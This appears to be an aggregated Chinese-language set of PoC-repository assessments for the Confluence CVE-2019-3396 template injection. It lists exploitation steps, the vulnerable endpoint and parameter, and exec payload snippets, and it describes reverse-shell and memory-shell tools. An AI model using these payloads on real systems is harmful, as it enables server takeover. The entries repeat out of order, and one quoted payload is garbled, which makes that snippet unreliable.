**影响版本:** 受影响版本：Confluence Server 6.6.12 之前的所有 6.6.x 版本；6.7.0 到 6.12.3 之前的所有 6.12.x 版本；6.13.0 到 6.13.3 之前的所有 6.13.x 版本；6.14.0 到 6.14.2 之前的所有 6.14.x 版本

**利用条件:** 需要目标Confluence实例存在Widget Connector宏且版本在受影响范围内，且允许用户编辑页面。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 漏洞存在于 Atlassian Confluence Server 和 Data Center 的 Widget Connector 宏中，允许未经身份验证的远程攻击者通过服务器端模板注入执行任意代码。攻击者可以通过构造包含恶意 Velocity 模板代码的请求，利用 Widget Connector 宏中的漏洞执行操作系统命令。根据漏洞库信息和搜索结果，该漏洞已被广泛利用，存在多种PoC。提供的漏洞利用代码是一个用于调试和分析漏洞的开发环境搭建指南，没有直接提供可用于攻击的有效payload，但可以辅助理解漏洞原理和构建利用代码。

**有效性评估：** 漏洞有效性高，因为漏洞库信息和搜索结果均表明该漏洞已被公开披露并被广泛利用。

**投毒风险评估：** 代码仓库的主要目的是提供一个本地调试和分析漏洞的环境，而不是直接提供一个用于攻击的利用脚本。虽然不能完全排除作者在构建环境中隐藏恶意代码的可能性，但考虑到代码仓库的内容主要是配置和调试指南，直接投毒的可能性较低。因此，投毒风险估计为 10%。风险主要来自于用户在搭建调试环境的过程中可能引入的外部依赖或配置不当。

**利用方式分析：**

1.  **定位 Widget Connector 宏：** 在 Confluence 页面中插入一个 Widget Connector 宏。
2.  **构造恶意请求：**  构造包含恶意 Velocity 模板代码的请求，例如 `${Runtime.getRuntime().exec("command")}`，该代码会被服务器解析并执行。
3.  **发送请求：** 将构造好的请求发送到 Confluence 服务器。请求可能包含在 Widget Connector 宏的 URL 参数或其他相关字段中。
4.  **执行代码：** Confluence 服务器在处理包含恶意模板代码的 Widget Connector 宏时，会执行其中的代码，导致远程代码执行。

从搜索结果来看，攻击者利用该漏洞传播恶意软件（如加密货币矿工和勒索软件）的情况较为普遍。

**项目地址:** [PetrusViet/cve-2019-3396](https://github.com/PetrusViet/cve-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #7

**来源**: [CVE-2019-3396-W2Ning_CVE-2019-3396.md](../2019/CVE-2019-3396-W2Ning_CVE-2019-3396.md)

## CVE-2019-3396-Confluence-Widget-Connector-SSTI

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入(SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** before 6.6.12, from 6.7.0 before 6.12.3, from 6.13.0 before 6.13.3, and from 6.14.0 before 6.14.2

**利用条件:** 需要Confluence Server实例存在Widget Connector宏，且版本在受影响范围内。无需身份验证。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞存在于Atlassian Confluence Server的Widget Connector宏中，由于对用户输入过滤不严格，导致攻击者可以通过构造恶意的Velocity模板代码，实现服务器端模板注入(SSTI)，进而执行任意代码。

**有效性分析：**

根据漏洞库信息和搜索结果，CVE-2019-3396是一个已知的且被广泛利用的漏洞。漏洞利用代码中提供了多个`.vm`文件，这些是Velocity模板文件，用于执行任意命令或获取服务器信息。`cmd.vm`和`cmd2.vm`用于执行命令，而`test.vm`用于获取系统属性。

根据提供的漏洞利用代码，`cmd.vm` 和 `cmd2.vm` 这两个文件利用 `java.lang.Runtime.getRuntime().exec()` 执行任意命令。`test.vm` 获取系统属性。这些代码与公开的漏洞利用信息相符，表明提供的POC代码有效。

**投毒风险分析：**

提供的漏洞利用代码主要包含Velocity模板文件(`.vm`)，以及一些jspx和aspx文件。Velocity模板文件用于服务器端模板注入，主要目的是执行命令或获取系统信息，本身不具备明显的投毒特征。
*   `cmd.vm` 和 `cmd2.vm`: 用于远程命令执行，直接利用了漏洞，不包含投毒代码。
*   `test.vm`: 用于获取系统属性，例如用户目录，操作系统等，不包含投毒代码。
*   `test.aspx` (C#): 通过Session传递密钥，然后使用RijndaelManaged算法进行解密，加载并执行，这段代码有作为webshell的潜力，但是它需要一个配合的加密后的payload才能生效，因此它的风险在于后续的payload。投毒风险较低。
*   `test.jspx`: 通过Session传递密钥，然后使用AES算法进行解密，加载并执行，这段代码有作为webshell的潜力，需要配合加密后的payload，因此它的风险在于后续的payload。投毒风险较低。

总体来看，投毒风险主要来源于`test.aspx`和`test.jspx` 潜在的后门风险，需要配合加密的payload才能触发。如果后续使用了被篡改的Payload可能会存在投毒行为,因此总体投毒风险评估为10%。

**利用方式：**

1.  **漏洞入口：**  利用Confluence Server中Widget Connector宏。
2.  **构造恶意Velocity模板：**  构造包含恶意代码的Velocity模板，例如利用`java.lang.Runtime.getRuntime().exec()`执行任意命令。
3.  **发送Payload：**  将构造好的恶意Velocity模板代码作为Widget Connector宏的参数发送给Confluence Server。
4.  **远程代码执行：**  Confluence Server解析Velocity模板时，执行其中的恶意代码，实现远程代码执行。

**项目地址:** [W2Ning/CVE-2019-3396](https://github.com/W2Ning/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #8

**来源**: [CVE-2019-3396-Yt1g3r_CVE-2019-3396_EXP.md](../2019/CVE-2019-3396-Yt1g3r_CVE-2019-3396_EXP.md)

## CVE-2019-3396 - Atlassian Confluence Widget Connector Macro SSTI RCE

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入（SSTI）导致远程代码执行（RCE）

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致完全控制Confluence服务器

**影响版本:** 受影响版本包括：6.6.0-6.6.11, 6.7.0-6.12.2, 6.13.0-6.13.2, 6.14.0-6.14.1

**利用条件:** 需要能够向Confluence服务器发送HTTP请求

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-3396是Atlassian Confluence Server中Widget Connector宏存在的一个服务器端模板注入漏洞。攻击者可以通过构造恶意的请求，利用Velocity模板引擎执行任意代码，从而完全控制Confluence服务器。 

**有效性:** 提供的POC代码有效。参考Rapid7和Exploit-DB的链接，都有公开的利用代码。POC代码 `RCE_exp.py` 使用 `requests` 库发送恶意构造的POST请求到 `/rest/tinymce/1/macro/preview` 接口，通过修改 `_template` 参数，注入Velocity模板代码，从而执行任意命令。

**投毒风险:**  代码仓库中的 `RCE_exp.py` 和 `cmd.vm` 看起来是标准的漏洞利用代码。`cmd.vm` 文件是Velocity模板代码，负责执行命令。`RCE_exp.py` 负责构造和发送HTTP请求，以及从响应中提取结果。没有发现明显的恶意代码或者后门，投毒的可能性较低。

**利用方式:**

1.  **漏洞原理：** Widget Connector宏允许用户在Confluence页面中嵌入来自外部源的内容。由于对用户提供的URL参数过滤不足，攻击者可以通过构造恶意的URL，触发服务器端模板注入。
2.  **利用步骤：**
    a.  准备一个包含恶意Velocity模板代码的文件（`cmd.vm`）。该文件包含执行命令的代码。
    b.  将 `cmd.vm` 文件放置在一个可以通过FTP或者HTTPS协议访问的服务器上。
    c.  修改 `RCE_exp.py` 脚本中的 `filename` 变量，指向 `cmd.vm` 文件的URL。
    d.  运行 `RCE_exp.py` 脚本，指定Confluence服务器的URL和要执行的命令。
    e.  脚本会发送包含恶意URL的POST请求到Confluence服务器。
    f.  Confluence服务器解析恶意URL，执行Velocity模板代码，从而执行攻击者指定的命令。
3.  **影响：** 成功利用此漏洞可以导致远程代码执行，攻击者可以获取Confluence服务器的完全控制权限，从而窃取敏感数据、篡改页面内容或者进行其他恶意活动。

**结论:**
此漏洞的POC代码有效，且利用方式相对简单，可以通过公开的POC代码进行验证。虽然搜索结果显示存在投毒的情况，但提供的代码中未发现明显的投毒迹象。此漏洞危害严重，需要及时修复。

**项目地址:** [Yt1g3r/CVE-2019-3396_EXP](https://github.com/Yt1g3r/CVE-2019-3396_EXP)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #9

**来源**: [CVE-2019-3396-am6539_CVE-2019-3396.md](../2019/CVE-2019-3396-am6539_CVE-2019-3396.md)

## CVE-2019-3396-Confluence-服务器端模板注入

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 受影响版本: 6.6.12之前 (6.6.x修复版本); 6.7.0 到 6.12.3之前 (6.12.x修复版本); 6.13.0 到 6.13.3之前 (6.13.x修复版本); 6.14.0 到 6.14.2之前 (6.14.x修复版本)

**利用条件:** 需要目标Confluence Server存在Widget Connector宏且未打补丁，攻击者需要能够访问Confluence Server的网络。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396是Atlassian Confluence Server中Widget Connector宏存在的一个服务器端模板注入漏洞。攻击者可以通过构造恶意的请求，利用Velocity模板引擎执行任意代码，从而实现远程代码执行。根据提供的漏洞利用代码，利用方式如下：

1.  **漏洞利用代码分析：**
    *   `cmd.vm`：包含一个Velocity模板，该模板利用java.lang.Runtime类执行系统命令。变量`$cmd`需要预先设置，然后注入到Velocity模板中。
    *   `nc.py`：一个Python脚本，用于建立反向连接shell。该脚本尝试连接到攻击者指定的IP地址和端口，然后将标准输入、输出和错误重定向到socket，最后使用pty.spawn启动一个shell。
    *   `README.md`：仅包含漏洞ID，无实际利用功能。

2.  **利用方式：**
    攻击者首先需要确定目标Confluence Server存在该漏洞。然后，攻击者需要构造一个包含恶意Velocity模板的请求，将`cmd.vm`中的模板内容嵌入到Widget Connector宏中，并设置`$cmd`变量为需要执行的命令。如果需要反向连接，则`$cmd`变量设置为执行`nc.py`脚本。攻击者需要在自己的服务器上监听指定的端口。当Confluence Server解析该恶意请求时，会执行其中的Velocity模板代码，从而执行攻击者指定的系统命令或反向连接。

3.  **有效性：**
    根据漏洞库信息和搜索结果，该漏洞利用POC是有效的。搜索结果中存在多个分析和利用示例，以及利用该漏洞传播恶意软件的案例。提供的`cmd.vm`代码是典型的Velocity模板注入payload，可以执行任意命令。

4.  **投毒风险：**
    `nc.py`脚本尝试清除和禁用历史记录，这可能是为了隐藏攻击痕迹。此外，需要手动设定IP地址与端口，存在一定的部署成本，不太利于大规模传播。因此，该仓库的整体投毒风险较低，大约为10%。这种投毒风险主要来自于攻击者可以修改nc.py或者cmd.vm文件，嵌入后门代码，一旦成功执行，会直接暴露服务器，但是这种添加的成本较高,收益相对较低。

**项目地址:** [am6539/CVE-2019-3396](https://github.com/am6539/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #10

**来源**: [CVE-2019-3396-dothanthitiendiettiende_CVE-2019-3396.md](../2019/CVE-2019-3396-dothanthitiendiettiende_CVE-2019-3396.md)

## CVE-2019-3396-Atlassian Confluence-服务器端模板注入

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 受影响版本包括 6.6.12 之前 (6.6.x修复版本), 6.7.0 到 6.12.3 之前 (6.12.x修复版本), 6.13.0 到 6.13.3 之前 (6.13.x修复版本), 以及 6.14.0 到 6.14.2 之前 (6.14.x修复版本)

**利用条件:** 需要能够访问Confluence服务器并利用Widget Connector宏。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-3396 是 Atlassian Confluence Server 中的一个服务器端模板注入漏洞，存在于 Widget Connector 宏中。攻击者可以利用 Velocity 模板语言执行任意代码。漏洞利用代码 `rce.vm` 使用了 Velocity 模板注入，通过反射获取 `java.lang.Runtime` 类，然后调用 `exec` 方法来执行命令。在这个例子中，执行的是 `calc.exe`，这是一个用于测试的payload，实际应用中可以替换为任意命令。根据漏洞库信息、搜索结果和漏洞利用代码，该漏洞的利用是有效的。根据搜索结果，该漏洞已被积极利用，攻击者利用该漏洞传播恶意软件，例如 Gandcrab 勒索软件和加密货币挖矿恶意软件。提供的POC代码非常直接，只包含简单的RCE代码，不存在隐藏的投毒代码。利用方式是通过构造恶意请求，在Widget Connector宏中使用恶意的Velocity模板代码，从而实现远程代码执行。

**项目地址:** [dothanthitiendiettiende/CVE-2019-3396](https://github.com/dothanthitiendiettiende/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #11

**来源**: [CVE-2019-3396-jas502n_CVE-2019-3396.md](../2019/CVE-2019-3396-jas502n_CVE-2019-3396.md)

# CVE-2019-3396

> 📦 该CVE有 **22** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2019-3396-0xNinjaCyclone_cve-2019-3396.md](../2019/CVE-2019-3396-0xNinjaCyclone_cve-2019-3396.md)

## CVE-2019-3396-Confluence-RCE

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (Server-Side Template Injection)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** before 6.6.12, from 6.7.0 before 6.12.3, from 6.13.0 before 6.13.3, and from 6.14.0 before 6.14.2

**利用条件:** 目标Confluence服务器存在Widget Connector宏，且未进行身份验证即可访问

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 漏洞存在于 Atlassian Confluence Server 的 Widget Connector 宏中。攻击者可以通过构造恶意的请求，利用服务器端模板注入漏洞执行任意代码。

**有效性：**
提供的POC代码看起来是有效的。漏洞库信息和搜索结果都表明该漏洞已经被广泛利用，并且有可用的POC代码。POC代码通过构造包含恶意Velocity模板的请求，发送到 Confluence 服务器的 `/rest/tinymce/1/macro/preview` 接口，从而触发模板注入。

**投毒风险：**
代码主要功能是利用Velocity模板注入执行命令。其中使用了一个FTP服务器来托管payload，这是一种常见的绕过防火墙或上传限制的方法。该ruby脚本代码的主要功能是利用该漏洞，未发现明显的恶意代码或后门，但是代码中存在远程下载payload的行为，如果payload被替换，则存在一定的风险, 评估投毒风险为10%。

**利用方式：**
1.  攻击者首先需要找到存在漏洞的Confluence服务器。
2.  攻击者需要搭建一个FTP服务器，用于托管恶意Velocity模板。
3.  攻击者构造一个包含恶意Velocity模板的HTTP POST请求，发送到Confluence服务器的`/rest/tinymce/1/macro/preview`接口。该请求利用了 Widget Connector 宏的模板注入漏洞。
4.  Confluence服务器解析恶意Velocity模板，执行攻击者指定的命令，从而实现远程代码执行。

**综上所述，该漏洞的利用有效性高，存在一定的投毒风险。攻击者可以利用该漏洞在Confluence服务器上执行任意代码。**

**项目地址:** [0xNinjaCyclone/cve-2019-3396](https://github.com/0xNinjaCyclone/cve-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #2

**来源**: [CVE-2019-3396-46o60_CVE-2019-3396_Confluence.md](../2019/CVE-2019-3396-46o60_CVE-2019-3396_Confluence.md)

## CVE-2019-3396_Confluence Widget Connector Macro SSTI

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，允许远程攻击者实现路径遍历和远程代码执行

**影响版本:** 受影响版本包括 6.6.12 之前, 6.7.0 至 6.12.3 之前, 6.13.0 至 6.13.3 之前, 以及 6.14.0 至 6.14.2 之前

**利用条件:** 需要目标系统存在漏洞版本的Confluence服务器，如果是RCE，可能需要合法的用户session。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396是Atlassian Confluence服务器中Widget Connector宏的一个服务器端模板注入漏洞。攻击者可以利用此漏洞进行路径遍历和远程代码执行。漏洞利用方式有两种：

1. **路径遍历（文件读取）：** 攻击者可以利用`_template`参数，通过构造恶意的路径，读取服务器上的任意文件或目录。此方式无需认证。

2. **远程代码执行（RCE）：** 攻击者可以上传一个包含恶意Velocity模板的文件到服务器，然后利用该漏洞从本地文件系统加载该模板，从而执行任意代码。此方式需要一个有效的用户session。该POC代码首先尝试找到用户的个人空间，如果不存在则创建，然后上传包含payload的模板文件，最后利用漏洞执行命令。

**关于投毒风险：**虽然代码看起来是直接利用漏洞，但仍存在一定的投毒风险（约10%）。

*   **依赖性风险：** 该脚本依赖于外部库（例如 `requests`）。如果攻击者控制了这些库的源或使用了被污染的库，则可能引入恶意代码。
*   **Payload风险：** 上传的Velocity模板payload可能被修改以执行未经授权的操作，或者被用于在受害者系统上安装恶意软件。
*   **后门风险：** 虽然该POC的目的是利用漏洞，但如果代码被恶意修改，可以在上传的模板中包含后门，允许攻击者在漏洞修复后仍然可以访问系统。

因此，在使用该POC时，建议仔细审查代码，确保所使用的库是可信的，并对上传的payload进行严格的安全评估。此外，还应监控Confluence服务器的行为，以检测任何可疑活动。

**项目地址:** [46o60/CVE-2019-3396_Confluence](https://github.com/46o60/CVE-2019-3396_Confluence)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #3

**来源**: [CVE-2019-3396-Avento_CVE-2019-3396-Memshell-for-Behinder.md](../2019/CVE-2019-3396-Avento_CVE-2019-3396-Memshell-for-Behinder.md)

## CVE-2019-3396-Atlassian Confluence Widget Connector Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** Server-Side Template Injection (SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** before 6.6.12, 6.7.0 before 6.12.3, 6.13.0 before 6.13.3, 6.14.0 before 6.14.2

**利用条件:** 需要Confluence服务器存在Widget Connector宏，并且允许用户插入宏内容

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396是Atlassian Confluence服务器中Widget Connector宏的一个服务器端模板注入漏洞。攻击者可以通过构造恶意宏内容，实现任意代码执行。 

**有效性：**
根据漏洞库信息、搜索引擎结果和提供的POC代码，可以判断此漏洞的POC是有效的。漏洞库信息明确指出该漏洞允许远程攻击者在Confluence服务器或数据中心实例上实现路径遍历和远程代码执行。搜索引擎结果中也提及了该漏洞被用于传播恶意软件，例如加密货币挖矿程序和Gandcrab勒索软件。提供的Java代码是一个典型的Java内存马，通过ServletRequestListener注入，劫持请求，从而实现RCE。

**投毒风险：**
该POC代码本身就是一个用于植入内存马的恶意代码。投毒风险的评估主要是判断作者是否在内存马本身之外，还加入了其他的恶意行为。在给定的代码片段中，我们可以看到有尝试写入错误信息到`/tmp/success-error-2`的逻辑，如果攻击者能够控制写入的文件路径，那么这将是一个潜在的投毒点。但是总体而言，这段代码的主要功能是内存马注入，额外的恶意行为并不明显。因此，初步判断投毒风险较低。如果代码仓库中有其他编译后的类或者配置文件，可能会包含更多的投毒行为，但是仅凭这段代码，投毒的可能性为10%。

**利用方式：**
1.  **利用入口：** 利用Confluence的Widget Connector宏插入恶意Velocity模板代码。
2.  **SSTI Payload：** 构造包含恶意代码的Velocity模板Payload。常见的Payload用于执行系统命令，例如：`{code}${#req = facotry.getObject().getClass().forName('javax.servlet.http.HttpServletRequest').getMethod('getRuntime',null).invoke(null,null).exec('whoami')}`
3.  **内存马注入 (POC)：**
    *   该POC代码的目的是将一个恶意的ServletRequestListener注册到Confluence的Servlet容器中。
    *   它首先尝试找到Confluence应用使用的ClassLoader，这通常需要遍历线程，找到包含特定名称的线程（如`hz.confluence.scheduled.thread`）。
    *   然后，它利用反射获取StandardContext，这是Servlet容器的核心组件。
    *   接着，它创建一个实现了ServletRequestListener接口的动态代理，并将其实例注册到StandardContext中。
    *   当有新的HTTP请求到达时，代理的invoke方法会被调用，执行`backDoor`方法（在给定的代码片段中未完整给出）。`backDoor`方法很可能会从请求中提取命令并执行，从而实现远程代码执行。

总而言之，该漏洞利用方式是先通过SSTI漏洞注入恶意代码，然后通过植入内存马的方式维持控制。


**项目地址:** [Avento/CVE-2019-3396-Memshell-for-Behinder](https://github.com/Avento/CVE-2019-3396-Memshell-for-Behinder)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #4

**来源**: [CVE-2019-3396-HK4zCzi_CVE-2019-3396-Velocity-Server-Side-Template-Injection.md](../2019/CVE-2019-3396-HK4zCzi_CVE-2019-3396-Velocity-Server-Side-Template-Injection.md)

## CVE-2019-3396-Confluence Widget Connector Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** Server-Side Template Injection (SSTI)

**影响应用:** Atlassian Confluence Server and Data Center

**危害等级:** 高危，允许远程攻击者在Confluence服务器或数据中心实例上实现路径遍历和远程代码执行。

**影响版本:** 受影响版本：Confluence Server 6.6.12之前，6.7.0至6.12.3之前，6.13.0至6.13.3之前，6.14.0至6.14.2之前

**利用条件:** 需要Confluence服务器存在Widget Connector宏，且服务器版本在受影响范围内。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396是一个影响Atlassian Confluence Server和Data Center的服务器端模板注入漏洞。该漏洞存在于Widget Connector宏中，允许未经身份验证的远程攻击者通过构造恶意的请求，执行任意代码。 

**有效性：**
根据漏洞库信息和搜索引擎结果，该漏洞是一个已知的、已被积极利用的漏洞，存在公开的PoC（Proof of Concept）代码。多个安全厂商（如Rapid7、Trend Micro等）都发布了关于该漏洞的分析和利用的报告。提供的PoC代码 `README.md` 文件表明该漏洞可以通过Velocity模板注入实现。虽然只提供了一个简单的 `README.md` 文件，但根据搜索结果，存在多个可用的PoC利用代码。

**投毒风险：**
提供的漏洞利用代码仅包含一个 `README.md` 文件，描述了漏洞名称。从现有文件本身来看，不存在明显的恶意代码。 但是，如果从其他源获取利用代码，则存在潜在的投毒风险。攻击者可能会在PoC中添加恶意功能，例如安装后门、窃取凭据或进行其他未经授权的活动。因此，在使用任何第三方提供的PoC代码之前，务必进行彻底的安全审查。 投毒风险估计为10%，主要是考虑到从不可信来源获取PoC的潜在风险。

**利用方式：**
漏洞的利用方式是通过在Confluence页面的Widget Connector宏中注入恶意的Velocity模板代码。当Confluence服务器渲染包含恶意代码的页面时，会执行该代码，从而允许攻击者执行任意命令。

1.  **找到存在Widget Connector宏的Confluence页面。**
2.  **构造包含恶意Velocity模板代码的请求。**
3.  **将请求发送到Confluence服务器。**
4.  **服务器执行恶意代码，实现远程代码执行。**

攻击者可以利用此漏洞执行任意系统命令，读取或修改敏感数据，或完全控制Confluence服务器。 搜索结果显示，该漏洞已被用于传播加密货币挖矿恶意软件和Gandcrab勒索软件。

**项目地址:** [HK4zCzi/CVE-2019-3396-Velocity-Server-Side-Template-Injection](https://github.com/HK4zCzi/CVE-2019-3396-Velocity-Server-Side-Template-Injection)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #5

**来源**: [CVE-2019-3396-JonathanZhou348_CVE-2019-3396TEST.md](../2019/CVE-2019-3396-JonathanZhou348_CVE-2019-3396TEST.md)

## CVE-2019-3396-Atlassian Confluence-Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** Server-Side Template Injection (SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** before 6.6.12, 6.7.0 before 6.12.3, 6.13.0 before 6.13.3, 6.14.0 before 6.14.2

**利用条件:** 需要Confluence Widget Connector宏开启且目标版本存在漏洞。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-3396 存在于 Atlassian Confluence Server 的 Widget Connector 宏中，由于服务端模板注入漏洞，攻击者可以通过构造恶意的 Velocity 模板代码，在 Confluence 服务器上执行任意命令。从提供的POC代码来看, `test.vm` 和 `test2.vm` 文件包含了利用 Velocity 模板引擎执行命令的代码。它们通过 `java.lang.Runtime` 类来执行系统命令，并读取命令执行结果。利用方式是，构造包含恶意Velocity代码的请求发送给Confluence服务器，服务器在渲染包含Widget Connector宏的页面时，会执行恶意代码，从而实现远程代码执行。根据搜索结果,该漏洞被广泛利用, 存在多种PoC和exp.

 **有效性:**  POC代码有效,因为它使用了Velocity模板语言来执行命令.通过getRuntime方法可以执行任意命令。

**投毒风险:** 仓库中主要包含用于漏洞验证和利用的Velocity模板代码，没有发现明显的恶意或后门代码，因此投毒风险较低。

**利用方式:**

1.  **定位漏洞点:** 确定目标Confluence服务器版本在受影响范围内，且启用了Widget Connector宏。
2.  **构造恶意请求:**  构建包含恶意Velocity模板代码的HTTP请求，该代码利用 `java.lang.Runtime` 执行系统命令。
3.  **发送请求:**  将构造好的请求发送给Confluence服务器。攻击者需要找到一个页面或接口，该页面或接口允许通过Widget Connector宏插入并渲染Velocity模板。
4.  **执行命令:** Confluence服务器解析并执行Velocity模板代码，从而在服务器上执行攻击者指定的命令。
5.  **获取结果:**  攻击者可以通过读取命令执行的输出来获取敏感信息，或者执行其他恶意操作。

**项目地址:** [JonathanZhou348/CVE-2019-3396TEST](https://github.com/JonathanZhou348/CVE-2019-3396TEST)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #6

**来源**: [CVE-2019-3396-PetrusViet_cve-2019-3396.md](../2019/CVE-2019-3396-PetrusViet_cve-2019-3396.md)

## CVE-2019-3396 - Atlassian Confluence Widget Connector 远程代码执行

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (Server-Side Template Injection)

**影响应用:** Atlassian Confluence Server/Data Center

**危害等级:** 高危，允许未授权的远程代码执行

**影响版本:** 受影响版本：Confluence Server 6.6.12 之前的所有 6.6.x 版本；6.7.0 到 6.12.3 之前的所有 6.12.x 版本；6.13.0 到 6.13.3 之前的所有 6.13.x 版本；6.14.0 到 6.14.2 之前的所有 6.14.x 版本

**利用条件:** 需要目标Confluence实例存在Widget Connector宏且版本在受影响范围内，且允许用户编辑页面。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 漏洞存在于 Atlassian Confluence Server 和 Data Center 的 Widget Connector 宏中，允许未经身份验证的远程攻击者通过服务器端模板注入执行任意代码。攻击者可以通过构造包含恶意 Velocity 模板代码的请求，利用 Widget Connector 宏中的漏洞执行操作系统命令。根据漏洞库信息和搜索结果，该漏洞已被广泛利用，存在多种PoC。提供的漏洞利用代码是一个用于调试和分析漏洞的开发环境搭建指南，没有直接提供可用于攻击的有效payload，但可以辅助理解漏洞原理和构建利用代码。

**有效性评估：** 漏洞有效性高，因为漏洞库信息和搜索结果均表明该漏洞已被公开披露并被广泛利用。

**投毒风险评估：** 代码仓库的主要目的是提供一个本地调试和分析漏洞的环境，而不是直接提供一个用于攻击的利用脚本。虽然不能完全排除作者在构建环境中隐藏恶意代码的可能性，但考虑到代码仓库的内容主要是配置和调试指南，直接投毒的可能性较低。因此，投毒风险估计为 10%。风险主要来自于用户在搭建调试环境的过程中可能引入的外部依赖或配置不当。

**利用方式分析：**

1.  **定位 Widget Connector 宏：** 在 Confluence 页面中插入一个 Widget Connector 宏。
2.  **构造恶意请求：**  构造包含恶意 Velocity 模板代码的请求，例如 `${Runtime.getRuntime().exec("command")}`，该代码会被服务器解析并执行。
3.  **发送请求：** 将构造好的请求发送到 Confluence 服务器。请求可能包含在 Widget Connector 宏的 URL 参数或其他相关字段中。
4.  **执行代码：** Confluence 服务器在处理包含恶意模板代码的 Widget Connector 宏时，会执行其中的代码，导致远程代码执行。

从搜索结果来看，攻击者利用该漏洞传播恶意软件（如加密货币矿工和勒索软件）的情况较为普遍。

**项目地址:** [PetrusViet/cve-2019-3396](https://github.com/PetrusViet/cve-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #7

**来源**: [CVE-2019-3396-W2Ning_CVE-2019-3396.md](../2019/CVE-2019-3396-W2Ning_CVE-2019-3396.md)

## CVE-2019-3396-Confluence-Widget-Connector-SSTI

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入(SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** before 6.6.12, from 6.7.0 before 6.12.3, from 6.13.0 before 6.13.3, and from 6.14.0 before 6.14.2

**利用条件:** 需要Confluence Server实例存在Widget Connector宏，且版本在受影响范围内。无需身份验证。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞存在于Atlassian Confluence Server的Widget Connector宏中，由于对用户输入过滤不严格，导致攻击者可以通过构造恶意的Velocity模板代码，实现服务器端模板注入(SSTI)，进而执行任意代码。

**有效性分析：**

根据漏洞库信息和搜索结果，CVE-2019-3396是一个已知的且被广泛利用的漏洞。漏洞利用代码中提供了多个`.vm`文件，这些是Velocity模板文件，用于执行任意命令或获取服务器信息。`cmd.vm`和`cmd2.vm`用于执行命令，而`test.vm`用于获取系统属性。

根据提供的漏洞利用代码，`cmd.vm` 和 `cmd2.vm` 这两个文件利用 `java.lang.Runtime.getRuntime().exec()` 执行任意命令。`test.vm` 获取系统属性。这些代码与公开的漏洞利用信息相符，表明提供的POC代码有效。

**投毒风险分析：**

提供的漏洞利用代码主要包含Velocity模板文件(`.vm`)，以及一些jspx和aspx文件。Velocity模板文件用于服务器端模板注入，主要目的是执行命令或获取系统信息，本身不具备明显的投毒特征。
*   `cmd.vm` 和 `cmd2.vm`: 用于远程命令执行，直接利用了漏洞，不包含投毒代码。
*   `test.vm`: 用于获取系统属性，例如用户目录，操作系统等，不包含投毒代码。
*   `test.aspx` (C#): 通过Session传递密钥，然后使用RijndaelManaged算法进行解密，加载并执行，这段代码有作为webshell的潜力，但是它需要一个配合的加密后的payload才能生效，因此它的风险在于后续的payload。投毒风险较低。
*   `test.jspx`: 通过Session传递密钥，然后使用AES算法进行解密，加载并执行，这段代码有作为webshell的潜力，需要配合加密后的payload，因此它的风险在于后续的payload。投毒风险较低。

